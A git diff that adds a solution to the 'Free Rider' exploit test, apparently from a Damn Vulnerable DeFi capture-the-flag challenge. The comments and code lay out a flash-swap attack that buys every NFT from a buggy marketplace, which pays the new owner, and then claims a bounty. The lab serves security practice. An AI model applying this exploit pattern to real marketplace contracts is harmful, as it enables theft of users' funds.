@@ -105,6 +105,38 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // Bug: After transfer NFT to buyer => Now Buyer is owner of NFT. 
+        // And the marketplace pay ETH to owner of NFT ....
+
+        // 0. Wrap attacker ETH to get WETH
+        // 1. Get some WETH from Uniswap pool by Flash Swap
+        // 2. Buy all NFT of Marketplace
+        // 3. Send to FreeRiderBuyer to get reward
+        const FreeRiderChallenge = await ethers.getContractFactory("FreeRiderChallenge");
+        const challenge = await FreeRiderChallenge.connect(attacker).deploy(
+            this.marketplace.address, 
+            this.uniswapPair.address,
+            this.nft.address,
+            this.buyerContract.address
+        );
+        await challenge.deployed();
+        console.log("Challenge deployed: ", challenge.address);
+
+
+        let someWETH = ethers.utils.parseEther("0.4");
+        await this.weth.connect(attacker).deposit(
+            { value: someWETH }
+        );
+
+        await this.weth.connect(attacker).transfer(
+            challenge.address,
+            someWETH
+        );
+
+        await challenge.connect(attacker).attack(
+            ethers.utils.parseEther("15")
+        );
     });
 
     after(async function () {
